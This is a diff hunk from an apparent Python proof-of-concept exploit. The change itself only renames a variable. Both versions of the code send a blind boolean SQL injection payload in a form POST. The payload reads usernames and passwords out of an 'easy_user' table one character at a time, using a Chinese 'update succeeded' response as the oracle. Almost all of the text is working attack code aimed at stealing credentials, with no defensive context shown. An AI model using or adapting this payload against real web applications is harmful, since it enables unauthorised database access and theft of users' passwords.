@@ -23,8 +23,8 @@ def poc():
 				header = {
 					"Content-Type":"application/x-www-form-urlencoded"
 				}
-				postdata = "id=1 and ascii(substr(((SELECT GROUP_CONCAT(username,0x20,password) FROM easy_user)),"+ str(j) +",1))%3d" + str(index[i]) + "&email=test%40test.com&sex=" + str(i+100)
-				r = requests.post(url,headers=header,data=postdata,cookies=cookies)
+				postData = "id=1 and ascii(substr(((SELECT GROUP_CONCAT(username,0x20,password) FROM easy_user)),"+ str(j) +",1))%3d" + str(index[i]) + "&email=test%40test.com&sex=" + str(i+100)
+				r = requests.post(url,headers=header,data=postData,cookies=cookies)
 
 				if "\u66f4\u65b0\u6210\u529f".decode('unicode_escape') in r.text:
 					if (index[i]):
